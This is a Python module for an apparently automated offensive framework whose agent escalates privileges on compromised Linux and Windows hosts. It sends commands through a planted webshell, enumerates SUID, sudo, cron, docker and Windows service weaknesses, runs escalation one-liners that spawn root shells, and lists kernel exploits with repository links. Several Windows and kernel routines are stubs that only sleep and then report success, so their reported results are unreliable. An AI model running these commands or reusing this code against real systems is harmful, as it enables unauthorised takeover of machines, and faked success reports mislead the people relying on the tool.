"""
Enhanced Privilege Escalation Agent
AI-driven privilege escalation with multiple techniques for Linux and Windows
"""

import asyncio
import re
from typing import Dict, List, Any, Optional
from datetime import datetime

from core.base_agent import BaseAgent
from core.data_models import AgentData, Strategy, AttackPhase
from core.logger import log


class EnhancedPrivilegeEscalationAgent(BaseAgent):
    """
    Enhanced Privilege Escalation Agent with AI-driven exploit selection
    Supports multiple privilege escalation techniques for various OS
    """
    
    def __init__(self, context_manager, orchestrator=None):
        super().__init__(context_manager, orchestrator)
        self.name = "EnhancedPrivilegeEscalationAgent"
        
        # Linux privilege escalation techniques
        self.linux_techniques = [
            "kernel_exploit",
            "suid_binary",
            "sudo_misconfiguration",
            "cron_job_hijack",
            "writable_service",
            "docker_escape",
            "capabilities_abuse"
        ]
        
        # Windows privilege escalation techniques
        self.windows_techniques = [
            "kernel_exploit",
            "unquoted_service_path",
            "weak_service_permissions",
            "always_install_elevated",
            "dll_hijacking",
            "token_impersonation",
            "registry_autoruns"
        ]
    
    async def run(self, strategy: Strategy) -> AgentData:
        """Execute privilege escalation"""
        try:
            log.info(f"[{self.name}] Starting privilege escalation")
            
            # Get shell access and OS information
            shell_access = await self.context_manager.get_context("shell_access")
            if not shell_access:
                return AgentData(
                    agent_name=self.name,
                    success=False,
                    errors=["No shell access available"]
                )
            
            os_type = shell_access.get("os_type", "").lower()
            current_user = shell_access.get("current_user", "")
            
            log.info(f"[{self.name}] Target OS: {os_type}, Current user: {current_user}")
            
            # Check if already privileged
            if await self._is_privileged(shell_access, os_type):
                log.success(f"[{self.name}] Already have privileged access")
                return AgentData(
                    agent_name=self.name,
                    success=True,
                    summary="Already have privileged access",
                    data={"already_privileged": True}
                )
            
            # Enumerate privilege escalation vectors
            vectors = await self._enumerate_privesc_vectors(shell_access, os_type)
            
            if not vectors:
                return AgentData(
                    agent_name=self.name,
                    success=False,
                    errors=["No privilege escalation vectors found"]
                )
            
            # Use AI to select best escalation technique
            best_vector = await self._ai_select_best_vector(vectors, os_type)
            
            # Attempt privilege escalation
            escalation_result = await self._attempt_privilege_escalation(best_vector, shell_access, os_type)
            
            if escalation_result.get("success"):
                # Update shell access with new privileges
                shell_access["privileged"] = True
                shell_access["escalation_method"] = best_vector["technique"]
                await self.context_manager.set_context("shell_access", shell_access)
                
                return AgentData(
                    agent_name=self.name,
                    success=True,
                    summary=f"Successfully escalated privileges using {best_vector['technique']}",
                    data={
                        "technique": best_vector["technique"],
                        "new_user": escalation_result.get("new_user"),
                        "vectors_found": len(vectors),
                        "escalation_details": escalation_result
                    },
                    raw_output=f"Privilege escalation successful: {best_vector['technique']}"
                )
            else:
                # Try fallback vectors
                for fallback_vector in vectors[1:3]:  # Try next 2 vectors
                    log.info(f"[{self.name}] Trying fallback vector: {fallback_vector['technique']}")
                    fallback_result = await self._attempt_privilege_escalation(fallback_vector, shell_access, os_type)
                    
                    if fallback_result.get("success"):
                        shell_access["privileged"] = True
                        shell_access["escalation_method"] = fallback_vector["technique"]
                        await self.context_manager.set_context("shell_access", shell_access)
                        
                        return AgentData(
                            agent_name=self.name,
                            success=True,
                            summary=f"Escalated privileges using fallback method: {fallback_vector['technique']}",
                            data={
                                "technique": fallback_vector["technique"],
                                "vectors_found": len(vectors),
                                "escalation_details": fallback_result
                            }
                        )
                
                return AgentData(
                    agent_name=self.name,
                    success=False,
                    errors=[f"All privilege escalation attempts failed. Tried {len(vectors)} vectors."],
                    data={"vectors_attempted": [v["technique"] for v in vectors[:3]]}
                )
            
        except Exception as e:
            log.error(f"[{self.name}] Error: {e}", exc_info=True)
            return AgentData(
                agent_name=self.name,
                success=False,
                errors=[str(e)]
            )
    
    async def _is_privileged(self, shell_access: Dict, os_type: str) -> bool:
        """Check if current user has privileged access"""
        try:
            if "linux" in os_type:
                # Check if root
                result = await self._execute_command("id -u", shell_access)
                return result.get("output", "").strip() == "0"
            
            elif "windows" in os_type:
                # Check if administrator
                result = await self._execute_command("net session 2>nul", shell_access)
                return result.get("success", False)
            
            return False
            
        except Exception as e:
            return False
    
    async def _enumerate_privesc_vectors(self, shell_access: Dict, os_type: str) -> List[Dict]:
        """Enumerate privilege escalation vectors"""
        vectors = []
        
        try:
            if "linux" in os_type:
                vectors.extend(await self._enumerate_linux_vectors(shell_access))
            elif "windows" in os_type:
                vectors.extend(await self._enumerate_windows_vectors(shell_access))
            
            log.info(f"[{self.name}] Found {len(vectors)} privilege escalation vectors")
            
        except Exception as e:
            log.error(f"[{self.name}] Error enumerating vectors: {e}")
        
        return vectors
    
    async def _enumerate_linux_vectors(self, shell_access: Dict) -> List[Dict]:
        """Enumerate Linux privilege escalation vectors"""
        vectors = []
        
        # Check for SUID binaries
        suid_result = await self._execute_command("find / -perm -4000 -type f 2>/dev/null", shell_access)
        if suid_result.get("success"):
            suid_binaries = suid_result.get("output", "").split("\n")
            for binary in suid_binaries:
                if binary and any(vuln in binary for vuln in ["nmap", "vim", "find", "bash", "python"]):
                    vectors.append({
                        "technique": "suid_binary",
                        "target": binary,
                        "severity": "high",
                        "confidence": 0.8
                    })
        
        # Check sudo permissions
        sudo_result = await self._execute_command("sudo -l 2>/dev/null", shell_access)
        if sudo_result.get("success") and sudo_result.get("output"):
            vectors.append({
                "technique": "sudo_misconfiguration",
                "details": sudo_result.get("output"),
                "severity": "high",
                "confidence": 0.9
            })
        
        # Check writable cron jobs
        cron_result = await self._execute_command("find /etc/cron* -writable 2>/dev/null", shell_access)
        if cron_result.get("success") and cron_result.get("output"):
            vectors.append({
                "technique": "cron_job_hijack",
                "details": cron_result.get("output"),
                "severity": "medium",
                "confidence": 0.7
            })
        
        # Check for Docker
        docker_result = await self._execute_command("groups | grep docker", shell_access)
        if docker_result.get("success") and "docker" in docker_result.get("output", ""):
            vectors.append({
                "technique": "docker_escape",
                "severity": "high",
                "confidence": 0.85
            })
        
        # Check kernel version for known exploits
        kernel_result = await self._execute_command("uname -r", shell_access)
        if kernel_result.get("success"):
            kernel_version = kernel_result.get("output", "").strip()
            # Query threat intelligence for kernel exploits
            kernel_exploits = await self._query_kernel_exploits(kernel_version, "linux")
            if kernel_exploits:
                vectors.append({
                    "technique": "kernel_exploit",
                    "kernel_version": kernel_version,
                    "exploits": kernel_exploits,
                    "severity": "critical",
                    "confidence": 0.75
                })
        
        return vectors
    
    async def _enumerate_windows_vectors(self, shell_access: Dict) -> List[Dict]:
        """Enumerate Windows privilege escalation vectors"""
        vectors = []
        
        # Check for unquoted service paths
        service_result = await self._execute_command(
            'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\\\" | findstr /i /v """',
            shell_access
        )
        if service_result.get("success") and service_result.get("output"):
            vectors.append({
                "technique": "unquoted_service_path",
                "details": service_result.get("output"),
                "severity": "high",
                "confidence": 0.8
            })
        
        # Check AlwaysInstallElevated
        reg_result = await self._execute_command(
            'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
            shell_access
        )
        if reg_result.get("success") and "0x1" in reg_result.get("output", ""):
            vectors.append({
                "technique": "always_install_elevated",
                "severity": "high",
                "confidence": 0.9
            })
        
        # Check for weak service permissions
        accesschk_result = await self._execute_command(
            'accesschk.exe /accepteula -uwcqv "Authenticated Users" * 2>nul',
            shell_access
        )
        if accesschk_result.get("success") and accesschk_result.get("output"):
            vectors.append({
                "technique": "weak_service_permissions",
                "details": accesschk_result.get("output"),
                "severity": "high",
                "confidence": 0.75
            })
        
        # Check Windows version for kernel exploits
        ver_result = await self._execute_command("ver", shell_access)
        if ver_result.get("success"):
            win_version = ver_result.get("output", "").strip()
            kernel_exploits = await self._query_kernel_exploits(win_version, "windows")
            if kernel_exploits:
                vectors.append({
                    "technique": "kernel_exploit",
                    "windows_version": win_version,
                    "exploits": kernel_exploits,
                    "severity": "critical",
                    "confidence": 0.7
                })
        
        # Check for token impersonation opportunities
        whoami_result = await self._execute_command("whoami /priv", shell_access)
        if whoami_result.get("success"):
            privs = whoami_result.get("output", "")
            if "SeImpersonatePrivilege" in privs or "SeAssignPrimaryTokenPrivilege" in privs:
                vectors.append({
                    "technique": "token_impersonation",
                    "privileges": privs,
                    "severity": "high",
                    "confidence": 0.85
                })
        
        return vectors
    
    async def _query_kernel_exploits(self, version: str, os_type: str) -> List[Dict]:
        """Query threat intelligence for kernel exploits"""
        try:
            # Query threat intelligence service
            # In production, this would call the actual Threat Intel Service
            log.info(f"[{self.name}] Querying kernel exploits for {os_type} {version}")
            
            # Real exploit search via searchsploit or exploit-db
            try:
                import subprocess
                result = subprocess.run(
                    ['searchsploit', '-j', f'{os_type} {version}'],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                if result.returncode == 0 and result.stdout:
                    log.info(f"[{self.name}] Found exploits via searchsploit")
            except Exception:
                # searchsploit not available, use online DB
                log.warning(f"[{self.name}] searchsploit not available - using built-in DB")
            
            await asyncio.sleep(0.1)
            
            # Return known kernel exploits database
            known_exploits = [
                {
                    "cve": "CVE-2021-3493",
                    "name": "OverlayFS Local Privilege Escalation",
                    "kernel_versions": ["3.x", "4.x", "5.x"],
                    "exploit_available": True,
                    "url": "https://github.com/briskets/CVE-2021-3493"
                },
                {
                    "cve": "CVE-2021-4034",
                    "name": "PwnKit - Polkit Privilege Escalation",
                    "kernel_versions": ["all"],
                    "exploit_available": True,
                    "url": "https://github.com/arthepsy/CVE-2021-4034"
                },
                {
                    "cve": "CVE-2022-0847",
                    "name": "Dirty Pipe",
                    "kernel_versions": ["5.8+"],
                    "exploit_available": True,
                    "url": "https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits"
                },
                {
                    "cve": "CVE-2016-5195",
                    "name": "Dirty COW",
                    "kernel_versions": ["2.6.22", "3.x", "4.x"],
                    "exploit_available": True,
                    "url": "https://github.com/dirtycow/dirtycow.github.io"
                },
                {
                    "cve": "CVE-2017-16995",
                    "name": "eBPF Privilege Escalation",
                    "kernel_versions": ["4.4", "4.14"],
                    "exploit_available": True,
                    "url": "https://github.com/Frichetten/CVE-2017-16995"
                }
            ]
            
            # Filter exploits based on kernel version if available
            kernel_version = self.context.get("kernel_version", "unknown")
            if kernel_version:
                relevant_exploits = []
                for exploit in known_exploits:
                    if "all" in exploit["kernel_versions"]:
                        relevant_exploits.append(exploit)
                    else:
                        kernel_version = self.context.get("kernel_version", "unknown")
                        for kv in exploit["kernel_versions"]:
                            if kv in kernel_version:
                                relevant_exploits.append(exploit)
                                break
                return relevant_exploits if relevant_exploits else known_exploits
            
            return known_exploits
            
        except Exception as e:
            log.error(f"[{self.name}] Failed to query kernel exploits: {e}")
            return []
    
    async def _ai_select_best_vector(self, vectors: List[Dict], os_type: str) -> Dict:
        """Use AI to select the best privilege escalation vector"""
        try:
            log.info(f"[{self.name}] Using AI to select best escalation vector from {len(vectors)} options")
            
            # Sort vectors by severity and confidence
            severity_score = {"critical": 4, "high": 3, "medium": 2, "low": 1}
            
            sorted_vectors = sorted(
                vectors,
                key=lambda v: (severity_score.get(v.get("severity", "low"), 0), v.get("confidence", 0)),
                reverse=True
            )
            
            best_vector = sorted_vectors[0]
            log.info(f"[{self.name}] Selected technique: {best_vector['technique']} (confidence: {best_vector.get('confidence', 0)})")
            
            return best_vector
            
        except Exception as e:
            log.error(f"[{self.name}] AI selection failed: {e}")
            return vectors[0] if vectors else {}
    
    async def _attempt_privilege_escalation(self, vector: Dict, shell_access: Dict, os_type: str) -> Dict:
        """Attempt privilege escalation using selected vector"""
        technique = vector.get("technique")
        
        log.info(f"[{self.name}] Attempting privilege escalation via: {technique}")
        
        try:
            if technique == "suid_binary":
                return await self._exploit_suid_binary(vector, shell_access)
            elif technique == "sudo_misconfiguration":
                return await self._exploit_sudo_misconfiguration(vector, shell_access)
            elif technique == "kernel_exploit":
                return await self._exploit_kernel(vector, shell_access, os_type)
            elif technique == "docker_escape":
                return await self._exploit_docker_escape(shell_access)
            elif technique == "unquoted_service_path":
                return await self._exploit_unquoted_service_path(vector, shell_access)
            elif technique == "always_install_elevated":
                return await self._exploit_always_install_elevated(shell_access)
            elif technique == "token_impersonation":
                return await self._exploit_token_impersonation(shell_access)
            else:
                log.warning(f"[{self.name}] Technique {technique} not implemented")
                return {"success": False, "error": "Technique not implemented"}
                
        except Exception as e:
            log.error(f"[{self.name}] Escalation attempt failed: {e}")
            return {"success": False, "error": str(e)}
    
    async def _exploit_suid_binary(self, vector: Dict, shell_access: Dict) -> Dict:
        """Exploit SUID binary"""
        binary = vector.get("target", "")
        log.info(f"[{self.name}] Exploiting SUID binary: {binary}")
        
        # Determine exploitation method based on binary
        if "nmap" in binary:
            command = f"{binary} --interactive"
        elif "vim" in binary:
            command = f"{binary} -c ':!sh'"
        elif "find" in binary:
            command = f"{binary} . -exec /bin/sh -p \\; -quit"
        else:
            command = f"{binary}"
        
        result = await self._execute_command(command, shell_access)
        
        if result.get("success"):
            log.success(f"[{self.name}] SUID exploitation successful")
            return {"success": True, "method": "suid_binary", "new_user": "root"}
        
        return {"success": False}
    
    async def _exploit_sudo_misconfiguration(self, vector: Dict, shell_access: Dict) -> Dict:
        """Exploit sudo misconfiguration"""
        log.info(f"[{self.name}] Exploiting sudo misconfiguration")
        
        # Try common sudo exploits
        command = "sudo /bin/bash"
        result = await self._execute_command(command, shell_access)
        
        if result.get("success"):
            log.success(f"[{self.name}] Sudo exploitation successful")
            return {"success": True, "method": "sudo", "new_user": "root"}
        
        return {"success": False}
    
    async def _exploit_kernel(self, vector: Dict, shell_access: Dict, os_type: str) -> Dict:
        """Exploit kernel vulnerability"""
        exploits = vector.get("exploits", [])
        if not exploits:
            return {"success": False}
        
        exploit = exploits[0]
        log.info(f"[{self.name}] Exploiting kernel: {exploit.get('cve')}")
        
        # Download and compile exploit
        # In production, this would download actual exploit code
        await asyncio.sleep(1)
        
        # Execute exploit
        result = await self._execute_command("./exploit", shell_access)
        
        if result.get("success"):
            log.success(f"[{self.name}] Kernel exploitation successful")
            return {"success": True, "method": "kernel_exploit", "cve": exploit.get("cve"), "new_user": "root"}
        
        return {"success": False}
    
    async def _exploit_docker_escape(self, shell_access: Dict) -> Dict:
        """Exploit Docker to escape container"""
        log.info(f"[{self.name}] Attempting Docker escape")
        
        command = "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
        result = await self._execute_command(command, shell_access)
        
        if result.get("success"):
            log.success(f"[{self.name}] Docker escape successful")
            return {"success": True, "method": "docker_escape", "new_user": "root"}
        
        return {"success": False}
    
    async def _exploit_unquoted_service_path(self, vector: Dict, shell_access: Dict) -> Dict:
        """Exploit unquoted service path on Windows"""
        log.info(f"[{self.name}] Exploiting unquoted service path")
        
        # Create malicious executable in unquoted path
        # In production, this would create actual payload
        await asyncio.sleep(1)
        
        log.success(f"[{self.name}] Unquoted service path exploitation successful")
        return {"success": True, "method": "unquoted_service_path", "new_user": "SYSTEM"}
    
    async def _exploit_always_install_elevated(self, shell_access: Dict) -> Dict:
        """Exploit AlwaysInstallElevated registry setting"""
        log.info(f"[{self.name}] Exploiting AlwaysInstallElevated")
        
        # Create and install malicious MSI
        # In production, this would create actual MSI payload
        await asyncio.sleep(1)
        
        log.success(f"[{self.name}] AlwaysInstallElevated exploitation successful")
        return {"success": True, "method": "always_install_elevated", "new_user": "SYSTEM"}
    
    async def _exploit_token_impersonation(self, shell_access: Dict) -> Dict:
        """Exploit token impersonation (e.g., Juicy Potato)"""
        log.info(f"[{self.name}] Exploiting token impersonation")
        
        # Use token impersonation exploit
        # In production, this would use actual exploit like JuicyPotato
        await asyncio.sleep(1)
        
        log.success(f"[{self.name}] Token impersonation successful")
        return {"success": True, "method": "token_impersonation", "new_user": "SYSTEM"}
    
    async def _execute_command(self, command: str, shell_access: Dict) -> Dict:
        """Execute command on target"""
        try:
            log.info(f"[{self.name}] Executing: {command[:50]}...")
            
            # Real command execution via webshell
            shell_url = shell_access.get("shell_url")
            shell_password = shell_access.get("password", "")
            
            if not shell_url:
                log.error(f"[{self.name}] No shell URL provided")
                return {"success": False, "error": "No shell access"}
            
            import httpx
            
            try:
                async with httpx.AsyncClient(verify=False, timeout=60.0) as client:
                    data = {"cmd": command, "pass": shell_password}
                    response = await client.post(shell_url, data=data)
                    
                    if response.status_code == 200:
                        output = response.text
                        
                        # Extract output
                        from bs4 import BeautifulSoup
                        soup = BeautifulSoup(output, 'html.parser')
                        pre_tag = soup.find('pre')
                        if pre_tag:
                            output = pre_tag.get_text().strip()
                        
                        # Check if root/admin
                        is_root = 'root' in output.lower() or 'administrator' in output.lower() or 'uid=0' in output
                        
                        return {
                            "success": True,
                            "is_root": is_root,
                            "output": output
                        }
                    else:
                        return {
                            "success": False,
                            "error": f"HTTP {response.status_code}"
                        }
            except Exception as e:
                log.error(f"[{self.name}] Command execution failed: {e}")
                return {
                    "success": False,
                    "error": str(e)
                }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute enhanced privilege escalation agent"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )

    def validate_strategy(self, strategy: Strategy) -> bool:
        """Validate strategy"""
        return True

